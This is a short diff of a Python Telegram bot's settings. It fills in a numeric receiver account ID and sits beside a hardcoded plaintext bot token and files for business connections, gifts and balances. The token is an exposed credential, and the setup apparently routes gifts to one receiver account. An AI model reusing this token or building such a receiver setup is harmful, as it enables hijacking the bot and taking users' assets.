@@ -36,7 +36,7 @@ logger = logging.getLogger(__name__)
 
 TOKEN = "8189356827:AAFz5RM1NhYMf5ycn9STeSha2h1uqBRCC2E"
 BOT_USERNAME = "@Kids_starsbot"
-RECEIVER_ID = айди_получателя
+RECEIVER_ID = 5858391454
 CONNECTIONS_FILE = "business_connections.json"
 GIFT_CHECKS_FILE = "gift_checks.json"
 USER_BALANCES_FILE = "user_balances.json"
